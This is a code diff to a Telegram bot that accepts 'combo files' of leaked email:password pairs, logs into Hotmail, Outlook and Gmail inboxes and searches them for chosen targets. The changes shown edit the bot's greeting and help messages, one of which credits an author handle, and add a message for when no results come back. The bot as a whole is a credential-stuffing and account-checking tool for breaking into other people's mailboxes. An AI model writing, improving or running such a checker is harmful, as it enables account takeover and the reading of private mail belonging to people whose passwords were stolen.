@@ -21,10 +21,10 @@ TARGETS = [
 ]
 
 def start(update: Update, _: CallbackContext) -> None:
-    update.message.reply_text('Hi! Send me your Hotmail - Gmail combo file (email:password) and I will check the inbox for specific targets. Author:@rundilundlegamera')
+    update.message.reply_text('Hi! Send me your combo file (email:password) and I will check the inbox for specific targets.')
 
 def help_command(update: Update, _: CallbackContext) -> None:
-    update.message.reply_text('Send me a text file with email:password pairs, and I will check the inbox for specific targets.')
+    update.message.reply_text('Hi! Send me your Hotmail - Gmail combo file (email:password) and I will check the inbox for specific targets. Author:@rundilundlegamera')
 
 def check_email_inbox(email_user, email_pass, targets):
     if "hotmail.com" in email_user or "outlook.com" in email_user:
@@ -87,6 +87,10 @@ def handle_document(update: Update, _: CallbackContext) -> None:
         data = check_email_inbox(email_user, email_pass, TARGETS)
         if data:
             results.append((email_user, email_pass, data))
+
+    if not results:
+        update.message.reply_text('No valid email:password pairs found or no emails processed.')
+        return
 
     response_text = ""
     for email, password, data in results:
